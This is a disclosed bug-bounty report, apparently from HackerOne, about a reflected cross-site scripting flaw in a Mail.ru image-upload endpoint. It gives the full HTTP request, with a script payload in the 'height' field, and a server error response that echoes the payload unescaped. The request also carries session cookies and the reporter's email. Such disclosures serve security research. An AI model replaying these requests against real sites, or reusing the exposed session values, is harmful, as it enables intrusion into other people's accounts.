@@ -1,0 +1,81 @@
+ReportLink:https://hackerone.com/reports/19334
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/isox
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:13.09.2015 12:04:12
+
+Summary:
+
+POST /ajax/upload_image/ HTTP/1.1
+Host: target.mail.ru
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://target.mail.ru/ads/create/
+Cookie: mrcu=C3EB52FA632E5958028A5821010A; p=8BkAAFHOkAAA; VID=3grP2o1i30nE:; s=fver=14|s_vp=(2560/644)|dpr=1; i=AQCwdrpTBwATAAgfClwAATABAWQBAowBAY0BAY8BAZoBAdwEAvQEAQAGAV0ABQIBAKgACAcCBQABvgABqgAIBwIFAAG+AAHJAAUCAfbvAQgEAQEAAVgDCAQBAQAB; b=gT8IAHDFSAUADLHRYSgjITSiIoT7WZPQmyoSAgAAwraBSEiZMwnnDG4inNK0AnE6+0UC; searchuid=9987040291391447473; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAAAID3gcA; _ga=GA1.2.145097379.1400943163; s_cp=dpr=2; c=Rnu6UwEAQMvTAAATAQAA1zzyaAAAEAAA; Mpop=1404730173:517058034772616319050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; mc1=1404730203; csrftoken=0MCegI2csNuNjB5Spgrouw08VvazbdKl; z=uxz03smodbato19j4wepmbqd2f9p6bwr; last_read_news_id=0; notifytop1=070720143; mrBizPromoPanel=1
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------15539954223049427401276649438
+Content-Length: 1342
+
+-----------------------------15539954223049427401276649438
+Content-Disposition: form-data; name="image_file"; filename="1px.jpg"
+Content-Type: image/jpeg
+
+ÿØÿà�JFIF��`�`��ÿÛ�C�		
+
+ $.' ",#(7),01444'9=82<.342ÿÛ�C			
+
+2!!22222222222222222222222222222222222222222222222222ÿÀ���"�ÿÄ�����������������ÿÄ�����������������ÿÄ�����������������ÿÄ�����������������ÿÚ���?�ÀÿÙ
+-----------------------------15539954223049427401276649438
+Content-Disposition: form-data; name="width"
+
+1080
+-----------------------------15539954223049427401276649438
+Content-Disposition: form-data; name="height"
+
+<script>alert(1);</script>
+-----------------------------15539954223049427401276649438
+Content-Disposition: form-data; name="max_height"
+
+90
+-----------------------------15539954223049427401276649438
+Content-Disposition: form-data; name="max_width"
+
+90
+-----------------------------15539954223049427401276649438
+Content-Disposition: form-data; name="min_height"
+
+60
+-----------------------------15539954223049427401276649438
+Content-Disposition: form-data; name="min_width"
+
+90
+-----------------------------15539954223049427401276649438
+Content-Disposition: form-data; name="rollover"
+
+True
+-----------------------------15539954223049427401276649438--
+
+
+
+
+
+
+
+HTTP/1.1 400 BAD REQUEST
+Server: nginx/1.2.8
+Date: Mon, 07 Jul 2014 11:11:25 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Vary: Cookie
+Set-Cookie: last_read_news_id=0; expires=Mon, 14-Jul-2014 11:11:25 GMT; Max-Age=604800; Path=/
+Content-Length: 74
+
+"{'height': u\"'<script>alert(1);</script>' is not type of int or long\"}"
+
+
+В фырфоксе отрабатывает ОК.
